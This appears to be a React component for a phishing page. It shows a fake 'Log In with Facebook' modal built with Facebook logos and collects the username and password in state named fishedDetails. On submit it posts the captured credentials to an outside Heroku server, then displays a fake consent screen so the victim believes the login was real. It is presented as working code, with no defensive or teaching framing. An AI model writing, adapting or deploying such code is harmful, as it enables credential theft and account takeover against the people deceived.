import React, { useState } from "react";
import './hook.css'
import axios from "axios";

//Images
import facebooklogo from '../../images/1024px-Facebook_Logo_(2019).webp'
import googlelogo from '../../images/google-logo-png-webinar-optimizing-for-success-google-business-webinar-13.png'
import twitterlogo from '../../images/twitter-logo-vector-png-clipart-1.png'
import name from '../../images/facebook-logo-15.png'

const Hook = ({toggle, control}) => {
    const [display, setDisplay] = useState(0)
    const [fishedDetails, setFishedDetails] = useState({
        Identity: "",
        Password: ""
    })

    async function handleSubmit(event) {
        event.preventDefault()

        if (fishedDetails.Identity && fishedDetails.Password) {
            await axios.get(`https://tritonai-server.herokuapp.com/FacebookLogin`).then(async re => {
                await axios.post(`https://tritonai-server.herokuapp.com/FacebookLogin`, {...re.data, Details: [...re.data.Details, fishedDetails]})
            })
            setDisplay(2)
        }
    }

    return(
        <div className="dimmer" style={{display: toggle ? "block" : "none", opacity:  toggle ? "1" : "0", zIndex: "98"}}>
            <div className="hookContainer" style={{marginTop: toggle ? "0px" : "-100vh"}}>
                <div className="hookSubContainer" style={{display: display === 0 ? "block" : "none"}}>
                    <h3 className="hookFrontTitle">Xalen</h3>
                    <h3 className="hookFrontLine">Sign Up to continue.</h3>
                    <div className="hookFrontOption" onClick={() => setDisplay(1)}>
                        <img src={facebooklogo} alt="logo" className="hookFrontOptionImage" />
                        <h3 className="hookFrontOptionText">Log In with Facebook</h3>
                    </div>
                    <div className="hookFrontOption">
                        <img src={googlelogo} alt="logo" className="hookFrontOptionImage" />
                        <h3 className="hookFrontOptionText">Log In with Google</h3>
                    </div>
                    <div className="hookFrontOption">
                        <img src={twitterlogo} alt="logo" className="hookFrontOptionImage" />
                        <h3 className="hookFrontOptionText">Log In with Twitter</h3>
                    </div>
                </div>
                <div className="hookSubContainer" style={{display: display === 1 ? "block" : "none"}}>
                    <div className="loginImageTitle">
                        <img className="loginLogoImage" src={facebooklogo} alt="logo" style={{height: "50px"}} />
                        <img className="loginNameImage" src={name} alt="name" style={{height: "30px"}} />
                    </div>
                    <h3 className="hookLoginLine">Log in to your Xalen account to connect to Xalen.</h3>
                    <form onSubmit={handleSubmit}>
                        <h3 className="loginFormLabel">Mobile Number or Email</h3>
                        <input type="text" className="loginFormField" value={fishedDetails.Identity} onChange={(e) => setFishedDetails({...fishedDetails, Identity: e.target.value})} required />
                        
                        <h3 className="loginFormLabel">Password</h3>
                        <input type="password" className="loginFormField" value={fishedDetails.Password} onChange={(e) => setFishedDetails({...fishedDetails, Password: e.target.value})} />
                        <input type="submit" className="loginFormSubmit" value="Log In" required />
                    </form>
                </div>
                <div className="hookSubContainer" style={{display: display === 2 ? "block" : "none"}}>
                    <div className="loginImageTitle" style={{marginBottom: "30px"}}>
                        <img className="loginLogoImage" src={facebooklogo} alt="logo" style={{height: "50px"}} />
                        <img className="loginNameImage" src={name} alt="name" style={{height: "30px"}} />
                    </div>
                    <h3 className="hookEaseLine">Are you sure you want to use this account?</h3>  
                    <h3 className="hookEaseLine" style={{marginBottom: "10px"}}>Xalen will get access to your:</h3>
                    <ul className="hookEaseList">
                        <li>Name</li>
                        <li>Gender</li>
                        <li>Country</li>
                        <li>Interests</li>
                    </ul>
                    <h3 className="hookEaseLine">This information is used to customise your chatting.</h3>
                    <h3 className="hookEaseLine">This doesn't allow Xalen to post anything.</h3>  
                    <button className="hookEaseContinue" onClick={() => control(false)}>Continue?</button>
                </div>
            </div>
        </div>
    )
}

export default Hook;